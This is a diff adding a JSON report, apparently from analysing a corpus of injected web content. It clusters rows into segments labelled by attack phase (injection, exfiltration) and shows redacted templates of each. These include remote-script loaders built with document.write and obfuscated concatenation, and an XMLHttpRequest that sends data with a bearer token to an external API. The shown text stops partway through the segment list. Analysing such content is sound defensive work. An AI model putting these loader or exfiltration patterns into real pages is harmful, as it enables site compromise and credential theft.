@@ -1,0 +1,5125 @@
+{
+  "high_level_phases": [
+    "Phase 1: ingestion, recon, injection and command construction",
+    "Phase 2: staging, relay, exfiltration, and cross-node work",
+    "Phase 3: integration, mutation, reconciliation, cleanup, and reuse"
+  ],
+  "low_level_segment_count": 100,
+  "minimum_low_level_segments_required": 100,
+  "pass_low_level_threshold": true,
+  "low_level_segments": [
+    {
+      "segment_id": "SEG001",
+      "high_level_phase": "Phase 1: ingestion, recon, injection and command construction",
+      "structural_signature": "[service <N> url <N>]=https://[redacted:destination:<N>]",
+      "sample_count": 7188,
+      "coverage_ratio": 0.038389,
+      "representative_ids": [
+        "R0079725",
+        "R0079727",
+        "R0079768",
+        "R0079824",
+        "R0079840",
+        "R0079887",
+        "R0079906",
+        "R0079923"
+      ],
+      "top_marker_strings": [
+        [
+          "[SERVICE 6 URL 1]",
+          3
+        ],
+        [
+          "[SERVICE 121 URL 7]",
+          2
+        ],
+        [
+          "[REDACTED:destination:009629]",
+          1
+        ],
+        [
+          "[REDACTED:destination:009630]",
+          1
+        ],
+        [
+          "[SERVICE 14 URL 4]",
+          1
+        ],
+        [
+          "[REDACTED:destination:009642]",
+          1
+        ],
+        [
+          "[REDACTED:destination:009655]",
+          1
+        ],
+        [
+          "[SERVICE 11 URL 7]",
+          1
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG002",
+      "high_level_phase": "Phase 1: ingestion, recon, injection and command construction",
+      "structural_signature": "https://[redacted:destination:<N>]",
+      "sample_count": 6453,
+      "coverage_ratio": 0.034463,
+      "representative_ids": [
+        "R0008575",
+        "R0018218",
+        "R0018220",
+        "R0018221",
+        "R0026704",
+        "R0036184",
+        "R0044610",
+        "R0045393"
+      ],
+      "top_marker_strings": [
+        [
+          "[REDACTED:destination:000851]",
+          1
+        ],
+        [
+          "[REDACTED:destination:002496]",
+          1
+        ],
+        [
+          "[REDACTED:destination:002497]",
+          1
+        ],
+        [
+          "[REDACTED:destination:002498]",
+          1
+        ],
+        [
+          "[REDACTED:destination:003842]",
+          1
+        ],
+        [
+          "[REDACTED:destination:005481]",
+          1
+        ],
+        [
+          "[REDACTED:destination:006742]",
+          1
+        ],
+        [
+          "[REDACTED:destination:006913]",
+          1
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG003",
+      "high_level_phase": "Phase 1: ingestion, recon, injection and command construction",
+      "structural_signature": "[service <N> url <N>]=https://[redacted:destination:<N>]]",
+      "sample_count": 3626,
+      "coverage_ratio": 0.019365,
+      "representative_ids": [
+        "R0078666",
+        "R0080098",
+        "R0080538",
+        "R0081364",
+        "R0083658",
+        "R0083671",
+        "R0083682",
+        "R0083699"
+      ],
+      "top_marker_strings": [
+        [
+          "[SERVICE 14 URL 4]",
+          6
+        ],
+        [
+          "[SERVICE 11 URL 2]",
+          2
+        ],
+        [
+          "[REDACTED:destination:008816]",
+          2
+        ],
+        [
+          "[REDACTED:destination:009730]",
+          1
+        ],
+        [
+          "[REDACTED:destination:009828]",
+          1
+        ],
+        [
+          "[REDACTED:destination:010101]",
+          1
+        ],
+        [
+          "[REDACTED:destination:010105]",
+          1
+        ],
+        [
+          "[REDACTED:destination:010108]",
+          1
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG004",
+      "high_level_phase": "Phase 1: ingestion, recon, injection and command construction",
+      "structural_signature": "── stage: a[] batch (<N> slots) ── [encoded blob <N>]",
+      "sample_count": 3477,
+      "coverage_ratio": 0.01857,
+      "representative_ids": [
+        "R0002331",
+        "R0002332",
+        "R0002333",
+        "R0002334",
+        "R0002335",
+        "R0002379",
+        "R0002381",
+        "R0002384"
+      ],
+      "top_marker_strings": [
+        [
+          "[ENCODED BLOB 278]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 279]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 280]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 281]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 282]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 291]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 292]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 293]",
+          1
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG005",
+      "high_level_phase": "Phase 1: ingestion, recon, injection and command construction",
+      "structural_signature": "[proxy <N> url <N>][encoded blob <N>][redacted:opaque_marker_tail:<N>]",
+      "sample_count": 3464,
+      "coverage_ratio": 0.0185,
+      "representative_ids": [
+        "R0054224",
+        "R0054226",
+        "R0054351",
+        "R0054358",
+        "R0054359",
+        "R0054365",
+        "R0054366",
+        "R0054367"
+      ],
+      "top_marker_strings": [
+        [
+          "[PROXY 4 URL 72]",
+          8
+        ],
+        [
+          "[REDACTED:opaque_marker_tail:000004]",
+          3
+        ],
+        [
+          "[REDACTED:opaque_marker_tail:000007]",
+          3
+        ],
+        [
+          "[ENCODED BLOB 1759]",
+          2
+        ],
+        [
+          "[REDACTED:opaque_marker_tail:000005]",
+          2
+        ],
+        [
+          "[ENCODED BLOB 1969]",
+          2
+        ],
+        [
+          "[ENCODED BLOB 1963]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 1965]",
+          1
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG006",
+      "high_level_phase": "Phase 1: ingestion, recon, injection and command construction",
+      "structural_signature": "[service <N> url <N>][encoded blob <N>][redacted:opaque_marker_tail:<N>] x+='[encoded blob <N>]';n('//[shortener url <N>]')",
+      "sample_count": 2834,
+      "coverage_ratio": 0.015135,
+      "representative_ids": [
+        "R0119063",
+        "R0119112",
+        "R0119126",
+        "R0119128",
+        "R0119141",
+        "R0119173",
+        "R0119178",
+        "R0119217"
+      ],
+      "top_marker_strings": [
+        [
+          "[SERVICE 3 URL 209]",
+          8
+        ],
+        [
+          "[REDACTED:opaque_marker_tail:000015]",
+          8
+        ],
+        [
+          "[ENCODED BLOB 73204]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 73205]",
+          1
+        ],
+        [
+          "[SHORTENER URL 150390]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 73248]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 73249]",
+          1
+        ],
+        [
+          "[SHORTENER URL 150401]",
+          1
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG007",
+      "high_level_phase": "Phase 1: ingestion, recon, injection and command construction",
+      "structural_signature": "x+='[encoded blob <N>]';n('//[shortener url <N>]')",
+      "sample_count": 2720,
+      "coverage_ratio": 0.014527,
+      "representative_ids": [
+        "R0007586",
+        "R0046590",
+        "R0054858",
+        "R0061525",
+        "R0065418",
+        "R0076443",
+        "R0114041",
+        "R0114049"
+      ],
+      "top_marker_strings": [
+        [
+          "[ENCODED BLOB 2197]",
+          3
+        ],
+        [
+          "[SHORTENER URL 13826]",
+          3
+        ],
+        [
+          "[ENCODED BLOB 39409]",
+          3
+        ],
+        [
+          "[SHORTENER URL 71291]",
+          3
+        ],
+        [
+          "[ENCODED BLOB 65690]",
+          1
+        ],
+        [
+          "[SHORTENER URL 148839]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 65691]",
+          1
+        ],
+        [
+          "[SHORTENER URL 148845]",
+          1
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG008",
+      "high_level_phase": "Phase 1: ingestion, recon, injection and command construction",
+      "structural_signature": "for(s of'[shortener code <N>],[shortener code <N>]'.split(','))document.write('<script src=[redacted:destination:<N>][shortener-<N>-host]'+s+'></script>')",
+      "sample_count": 2708,
+      "coverage_ratio": 0.014463,
+      "representative_ids": [
+        "R0014853",
+        "R0018790",
+        "R0018791",
+        "R0018792",
+        "R0018799",
+        "R0019240",
+        "R0019241",
+        "R0019242"
+      ],
+      "top_marker_strings": [
+        [
+          "[REDACTED:destination:000003]",
+          8
+        ],
+        [
+          "[SHORTENER-1-HOST]",
+          8
+        ],
+        [
+          "[SHORTENER CODE 21918]",
+          1
+        ],
+        [
+          "[SHORTENER CODE 21919]",
+          1
+        ],
+        [
+          "[SHORTENER CODE 26231]",
+          1
+        ],
+        [
+          "[SHORTENER CODE 26232]",
+          1
+        ],
+        [
+          "[SHORTENER CODE 26233]",
+          1
+        ],
+        [
+          "[SHORTENER CODE 26234]",
+          1
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG009",
+      "high_level_phase": "Phase 1: ingestion, recon, injection and command construction",
+      "structural_signature": "x+='[encoded blob <N>]';n('[redacted:opaque_fragment:<N>]')",
+      "sample_count": 2674,
+      "coverage_ratio": 0.014281,
+      "representative_ids": [
+        "R0114238",
+        "R0114239",
+        "R0114240",
+        "R0114242",
+        "R0114244",
+        "R0114245",
+        "R0114246",
+        "R0114247"
+      ],
+      "top_marker_strings": [
+        [
+          "[ENCODED BLOB 65711]",
+          1
+        ],
+        [
+          "[REDACTED:opaque_fragment:001199]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 65712]",
+          1
+        ],
+        [
+          "[REDACTED:opaque_fragment:001200]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 65713]",
+          1
+        ],
+        [
+          "[REDACTED:opaque_fragment:001201]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 65714]",
+          1
+        ],
+        [
+          "[REDACTED:opaque_fragment:001203]",
+          1
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG010",
+      "high_level_phase": "Phase 1: ingestion, recon, injection and command construction",
+      "structural_signature": "[service <N> url <N>][encoded blob <N>] x+='[encoded blob <N>]';n('//[shortener url <N>]')",
+      "sample_count": 1900,
+      "coverage_ratio": 0.010147,
+      "representative_ids": [
+        "R0119051",
+        "R0119058",
+        "R0119059",
+        "R0119060",
+        "R0119084",
+        "R0119125",
+        "R0119148",
+        "R0119166"
+      ],
+      "top_marker_strings": [
+        [
+          "[SERVICE 3 URL 209]",
+          8
+        ],
+        [
+          "[ENCODED BLOB 73187]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 73188]",
+          1
+        ],
+        [
+          "[SHORTENER URL 150387]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 73198]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 73199]",
+          1
+        ],
+        [
+          "[SHORTENER URL 143293]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 73200]",
+          1
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG011",
+      "high_level_phase": "Phase 1: ingestion, recon, injection and command construction",
+      "structural_signature": "x+='[redacted:opaque_fragment:<N>]';n('[redacted:opaque_fragment:<N>]')",
+      "sample_count": 1753,
+      "coverage_ratio": 0.009362,
+      "representative_ids": [
+        "R0115267",
+        "R0115502",
+        "R0115925",
+        "R0116223",
+        "R0116235",
+        "R0116249",
+        "R0116250",
+        "R0116271"
+      ],
+      "top_marker_strings": [
+        [
+          "[REDACTED:opaque_fragment:001204]",
+          6
+        ],
+        [
+          "[REDACTED:opaque_fragment:002210]",
+          1
+        ],
+        [
+          "[REDACTED:opaque_fragment:002440]",
+          1
+        ],
+        [
+          "[REDACTED:opaque_fragment:001175]",
+          1
+        ],
+        [
+          "[REDACTED:opaque_fragment:003137]",
+          1
+        ],
+        [
+          "[REDACTED:opaque_fragment:003149]",
+          1
+        ],
+        [
+          "[REDACTED:opaque_fragment:003163]",
+          1
+        ],
+        [
+          "[REDACTED:opaque_fragment:003164]",
+          1
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG012",
+      "high_level_phase": "Phase 1: ingestion, recon, injection and command construction",
+      "structural_signature": "[proxy <N> url <N>][encoded blob <N>][redacted:opaque_marker_tail:<N>] x+='[redacted:opaque_fragment:<N>]';document.write('<script src=[shortener url <N>]><\\/script>')",
+      "sample_count": 1747,
+      "coverage_ratio": 0.00933,
+      "representative_ids": [
+        "R0119000",
+        "R0119014",
+        "R0119021",
+        "R0119046",
+        "R0119052",
+        "R0119087",
+        "R0119117",
+        "R0119127"
+      ],
+      "top_marker_strings": [
+        [
+          "[PROXY 4 URL 72]",
+          8
+        ],
+        [
+          "[REDACTED:opaque_marker_tail:000007]",
+          7
+        ],
+        [
+          "[ENCODED BLOB 73130]",
+          1
+        ],
+        [
+          "[REDACTED:opaque_fragment:003328]",
+          1
+        ],
+        [
+          "[SHORTENER URL 150375]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 73147]",
+          1
+        ],
+        [
+          "[REDACTED:opaque_fragment:003330]",
+          1
+        ],
+        [
+          "[SHORTENER URL 150378]",
+          1
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG013",
+      "high_level_phase": "Phase 1: ingestion, recon, injection and command construction",
+      "structural_signature": "https://[redacted:destination:<N>]]",
+      "sample_count": 1653,
+      "coverage_ratio": 0.008828,
+      "representative_ids": [
+        "R0009504",
+        "R0024724",
+        "R0025317",
+        "R0036210",
+        "R0036243",
+        "R0036475",
+        "R0036985",
+        "R0041411"
+      ],
+      "top_marker_strings": [
+        [
+          "[REDACTED:destination:001067]",
+          1
+        ],
+        [
+          "[REDACTED:destination:003477]",
+          1
+        ],
+        [
+          "[REDACTED:destination:003665]",
+          1
+        ],
+        [
+          "[REDACTED:destination:005492]",
+          1
+        ],
+        [
+          "[REDACTED:destination:005499]",
+          1
+        ],
+        [
+          "[REDACTED:destination:005528]",
+          1
+        ],
+        [
+          "[REDACTED:destination:005612]",
+          1
+        ],
+        [
+          "[REDACTED:destination:006176]",
+          1
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG014",
+      "high_level_phase": "Phase 1: ingestion, recon, injection and command construction",
+      "structural_signature": "[redacted:opaque_base<N>:<N>]",
+      "sample_count": 1619,
+      "coverage_ratio": 0.008647,
+      "representative_ids": [
+        "R0009081",
+        "R0009083",
+        "R0053489",
+        "R0055635",
+        "R0056931",
+        "R0056934",
+        "R0056936",
+        "R0056948"
+      ],
+      "top_marker_strings": [
+        [
+          "[REDACTED:opaque_base64:000097]",
+          1
+        ],
+        [
+          "[REDACTED:opaque_base64:000098]",
+          1
+        ],
+        [
+          "[REDACTED:opaque_base64:000001]",
+          1
+        ],
+        [
+          "[REDACTED:opaque_base64:000177]",
+          1
+        ],
+        [
+          "[REDACTED:opaque_base64:000390]",
+          1
+        ],
+        [
+          "[REDACTED:opaque_base64:000391]",
+          1
+        ],
+        [
+          "[REDACTED:opaque_base64:000392]",
+          1
+        ],
+        [
+          "[REDACTED:opaque_base64:000393]",
+          1
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG015",
+      "high_level_phase": "Phase 1: ingestion, recon, injection and command construction",
+      "structural_signature": "[service host <N>][encoded blob <N>]",
+      "sample_count": 1515,
+      "coverage_ratio": 0.008091,
+      "representative_ids": [
+        "R0054825",
+        "R0054834",
+        "R0054839",
+        "R0054848",
+        "R0054851",
+        "R0055299",
+        "R0055304",
+        "R0055308"
+      ],
+      "top_marker_strings": [
+        [
+          "[SERVICE HOST 25]",
+          8
+        ],
+        [
+          "[ENCODED BLOB 2180]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 2183]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 2185]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 2187]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 2189]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 3116]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 3118]",
+          1
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG016",
+      "high_level_phase": "Phase 1: ingestion, recon, injection and command construction",
+      "structural_signature": "[service <N> url <N>][encoded blob <N>][redacted:opaque_marker_tail:<N>] x+='[redacted:opaque_fragment:<N>]';n('[redacted:opaque_fragment:<N>]')",
+      "sample_count": 1493,
+      "coverage_ratio": 0.007974,
+      "representative_ids": [
+        "R0119023",
+        "R0119107",
+        "R0119142",
+        "R0119169",
+        "R0119195",
+        "R0119197",
+        "R0119225",
+        "R0119405"
+      ],
+      "top_marker_strings": [
+        [
+          "[REDACTED:opaque_marker_tail:000008]",
+          7
+        ],
+        [
+          "[SERVICE 3 URL 209]",
+          5
+        ],
+        [
+          "[SERVICE 3 URL 245]",
+          3
+        ],
+        [
+          "[ENCODED BLOB 73157]",
+          1
+        ],
+        [
+          "[REDACTED:opaque_fragment:003332]",
+          1
+        ],
+        [
+          "[REDACTED:opaque_fragment:003333]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 73247]",
+          1
+        ],
+        [
+          "[REDACTED:opaque_fragment:003348]",
+          1
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG017",
+      "high_level_phase": "Phase 1: ingestion, recon, injection and command construction",
+      "structural_signature": "[encoded blob <N>]",
+      "sample_count": 1323,
+      "coverage_ratio": 0.007066,
+      "representative_ids": [
+        "R0003159",
+        "R0003160",
+        "R0003161",
+        "R0004819",
+        "R0005171",
+        "R0005172",
+        "R0005424",
+        "R0005426"
+      ],
+      "top_marker_strings": [
+        [
+          "[ENCODED BLOB 717]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 718]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 719]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 1229]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 1685]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 1686]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 1720]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 1721]",
+          1
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG018",
+      "high_level_phase": "Phase 1: ingestion, recon, injection and command construction",
+      "structural_signature": "<script src=[shortener url <N>]></script>",
+      "sample_count": 1320,
+      "coverage_ratio": 0.00705,
+      "representative_ids": [
+        "R0054227",
+        "R0054349",
+        "R0054357",
+        "R0054360",
+        "R0054363",
+        "R0054368",
+        "R0054373",
+        "R0054378"
+      ],
+      "top_marker_strings": [
+        [
+          "[SHORTENER URL 9950]",
+          1
+        ],
+        [
+          "[SHORTENER URL 12766]",
+          1
+        ],
+        [
+          "[SHORTENER URL 12778]",
+          1
+        ],
+        [
+          "[SHORTENER URL 12779]",
+          1
+        ],
+        [
+          "[SHORTENER URL 12780]",
+          1
+        ],
+        [
+          "[SHORTENER URL 12781]",
+          1
+        ],
+        [
+          "[SHORTENER URL 12782]",
+          1
+        ],
+        [
+          "[SHORTENER URL 12783]",
+          1
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG019",
+      "high_level_phase": "Phase 1: ingestion, recon, injection and command construction",
+      "structural_signature": "[shortener url <N>]",
+      "sample_count": 1287,
+      "coverage_ratio": 0.006873,
+      "representative_ids": [
+        "R0054032",
+        "R0054033",
+        "R0054034",
+        "R0055095",
+        "R0055116",
+        "R0061748",
+        "R0063945",
+        "R0063947"
+      ],
+      "top_marker_strings": [
+        [
+          "[SHORTENER URL 5627]",
+          5
+        ],
+        [
+          "[SHORTENER URL 14432]",
+          1
+        ],
+        [
+          "[SHORTENER URL 14452]",
+          1
+        ],
+        [
+          "[SHORTENER URL 76559]",
+          1
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG020",
+      "high_level_phase": "Phase 1: ingestion, recon, injection and command construction",
+      "structural_signature": "document.write('<script src=[redacted:destination:<N>][shortener url <N>]><\\/script><script src=[redacted:destination:<N>][shortener url <N>]><\\/script>')",
+      "sample_count": 1218,
+      "coverage_ratio": 0.006505,
+      "representative_ids": [
+        "R0001558",
+        "R0001709",
+        "R0001721",
+        "R0001722",
+        "R0001723",
+        "R0001724",
+        "R0001725",
+        "R0001726"
+      ],
+      "top_marker_strings": [
+        [
+          "[REDACTED:destination:000003]",
+          16
+        ],
+        [
+          "[SHORTENER URL 860]",
+          1
+        ],
+        [
+          "[SHORTENER URL 861]",
+          1
+        ],
+        [
+          "[SHORTENER URL 998]",
+          1
+        ],
+        [
+          "[SHORTENER URL 999]",
+          1
+        ],
+        [
+          "[SHORTENER URL 1039]",
+          1
+        ],
+        [
+          "[SHORTENER URL 1040]",
+          1
+        ],
+        [
+          "[SHORTENER URL 1041]",
+          1
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG021",
+      "high_level_phase": "Phase 1: ingestion, recon, injection and command construction",
+      "structural_signature": "x=(self.x||'')+'[encoded blob]';document.write('<script src=[redacted:destination:<N>][shortener url <N>]><\\/script>')",
+      "sample_count": 1173,
+      "coverage_ratio": 0.006265,
+      "representative_ids": [
+        "R0014671",
+        "R0014712",
+        "R0014713",
+        "R0014715",
+        "R0014716",
+        "R0014717",
+        "R0014720",
+        "R0014722"
+      ],
+      "top_marker_strings": [
+        [
+          "[ENCODED BLOB]",
+          8
+        ],
+        [
+          "[REDACTED:destination:000003]",
+          8
+        ],
+        [
+          "[SHORTENER URL 21701]",
+          1
+        ],
+        [
+          "[SHORTENER URL 2133]",
+          1
+        ],
+        [
+          "[SHORTENER URL 21743]",
+          1
+        ],
+        [
+          "[SHORTENER URL 21744]",
+          1
+        ],
+        [
+          "[SHORTENER URL 21745]",
+          1
+        ],
+        [
+          "[SHORTENER URL 21767]",
+          1
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG022",
+      "high_level_phase": "Phase 1: ingestion, recon, injection and command construction",
+      "structural_signature": "x+='[redacted:opaque_fragment:<N>]';n('//[shortener url <N>]')",
+      "sample_count": 1165,
+      "coverage_ratio": 0.006222,
+      "representative_ids": [
+        "R0006879",
+        "R0008028",
+        "R0008029",
+        "R0008031",
+        "R0008032",
+        "R0008033",
+        "R0024231",
+        "R0031296"
+      ],
+      "top_marker_strings": [
+        [
+          "[REDACTED:opaque_fragment:000053]",
+          1
+        ],
+        [
+          "[SHORTENER URL 12749]",
+          1
+        ],
+        [
+          "[REDACTED:opaque_fragment:000091]",
+          1
+        ],
+        [
+          "[SHORTENER URL 14298]",
+          1
+        ],
+        [
+          "[REDACTED:opaque_fragment:000092]",
+          1
+        ],
+        [
+          "[SHORTENER URL 14299]",
+          1
+        ],
+        [
+          "[REDACTED:opaque_fragment:000093]",
+          1
+        ],
+        [
+          "[SHORTENER URL 14311]",
+          1
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG023",
+      "high_level_phase": "Phase 1: ingestion, recon, injection and command construction",
+      "structural_signature": "[service <N> url <N>][encoded blob <N>] x+='[redacted:opaque_fragment:<N>]';n('[redacted:opaque_fragment:<N>]')",
+      "sample_count": 1121,
+      "coverage_ratio": 0.005987,
+      "representative_ids": [
+        "R0118998",
+        "R0119258",
+        "R0119308",
+        "R0119438",
+        "R0119583",
+        "R0119597",
+        "R0119692",
+        "R0119723"
+      ],
+      "top_marker_strings": [
+        [
+          "[SERVICE 3 URL 209]",
+          6
+        ],
+        [
+          "[SERVICE 3 URL 245]",
+          2
+        ],
+        [
+          "[ENCODED BLOB 73127]",
+          1
+        ],
+        [
+          "[REDACTED:opaque_fragment:003326]",
+          1
+        ],
+        [
+          "[REDACTED:opaque_fragment:003327]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 73401]",
+          1
+        ],
+        [
+          "[REDACTED:opaque_fragment:003370]",
+          1
+        ],
+        [
+          "[REDACTED:opaque_fragment:003371]",
+          1
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG024",
+      "high_level_phase": "Phase 1: ingestion, recon, injection and command construction",
+      "structural_signature": "x+='[redacted sensitive content]';n('[redacted:opaque_fragment:<N>]')",
+      "sample_count": 1120,
+      "coverage_ratio": 0.005982,
+      "representative_ids": [
+        "R0114241",
+        "R0114243",
+        "R0114264",
+        "R0114273",
+        "R0114314",
+        "R0114333",
+        "R0114335",
+        "R0114339"
+      ],
+      "top_marker_strings": [
+        [
+          "[REDACTED SENSITIVE CONTENT]",
+          8
+        ],
+        [
+          "[REDACTED:opaque_fragment:001204]",
+          3
+        ],
+        [
+          "[REDACTED:opaque_fragment:001202]",
+          1
+        ],
+        [
+          "[REDACTED:opaque_fragment:001225]",
+          1
+        ],
+        [
+          "[REDACTED:opaque_fragment:001234]",
+          1
+        ],
+        [
+          "[REDACTED:opaque_fragment:001294]",
+          1
+        ],
+        [
+          "[REDACTED:opaque_fragment:001298]",
+          1
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG025",
+      "high_level_phase": "Phase 1: ingestion, recon, injection and command construction",
+      "structural_signature": "x=new xmlhttprequest;x.open('post','https://huggingface.co/api/datasets/[redacted:destination:<N>]',false);x.setrequestheader('authorization','bearer [credential <N>]');x.setrequestheader('content-type','application/x-ndjson');x.send('{\"key\":\"header\",\"value\":{",
+      "sample_count": 1077,
+      "coverage_ratio": 0.005752,
+      "representative_ids": [
+        "R0012216",
+        "R0012228",
+        "R0012284",
+        "R0012307",
+        "R0012367",
+        "R0012577",
+        "R0012742",
+        "R0012764"
+      ],
+      "top_marker_strings": [
+        [
+          "[CREDENTIAL 169]",
+          8
+        ],
+        [
+          "[REDACTED:destination:001613]",
+          3
+        ],
+        [
+          "[REDACTED:destination:001607]",
+          1
+        ],
+        [
+          "[REDACTED:destination:001582]",
+          1
+        ],
+        [
+          "[REDACTED:destination:001615]",
+          1
+        ],
+        [
+          "[REDACTED:destination:001633]",
+          1
+        ],
+        [
+          "[REDACTED:destination:001647]",
+          1
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG026",
+      "high_level_phase": "Phase 1: ingestion, recon, injection and command construction",
+      "structural_signature": "x+='[redacted:opaque_fragment:<N>]';document.write('<script src=[shortener url <N>]><\\/script",
+      "sample_count": 1052,
+      "coverage_ratio": 0.005618,
+      "representative_ids": [
+        "R0064772",
+        "R0064782",
+        "R0064800",
+        "R0064801",
+        "R0064824",
+        "R0064828",
+        "R0064830",
+        "R0064837"
+      ],
+      "top_marker_strings": [
+        [
+          "[REDACTED:opaque_fragment:000153]",
+          1
+        ],
+        [
+          "[SHORTENER URL 12781]",
+          1
+        ],
+        [
+          "[REDACTED:opaque_fragment:000152]",
+          1
+        ],
+        [
+          "[SHORTENER URL 12780]",
+          1
+        ],
+        [
+          "[REDACTED:opaque_fragment:000382]",
+          1
+        ],
+        [
+          "[SHORTENER URL 12786]",
+          1
+        ],
+        [
+          "[REDACTED:opaque_fragment:000384]",
+          1
+        ],
+        [
+          "[SHORTENER URL 12787]",
+          1
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG027",
+      "high_level_phase": "Phase 1: ingestion, recon, injection and command construction",
+      "structural_signature": "[service <N> url <N>]",
+      "sample_count": 983,
+      "coverage_ratio": 0.00525,
+      "representative_ids": [
+        "R0000320",
+        "R0040699",
+        "R0052682",
+        "R0053462",
+        "R0055411",
+        "R0055466",
+        "R0060738",
+        "R0062535"
+      ],
+      "top_marker_strings": [
+        [
+          "[SERVICE 2 URL 3]",
+          3
+        ],
+        [
+          "[SERVICE 2 URL 45]",
+          2
+        ],
+        [
+          "[SERVICE 21 URL 1332]",
+          1
+        ],
+        [
+          "[SERVICE 3 URL 5]",
+          1
+        ],
+        [
+          "[SERVICE 2 URL 1]",
+          1
+        ]
+      ],
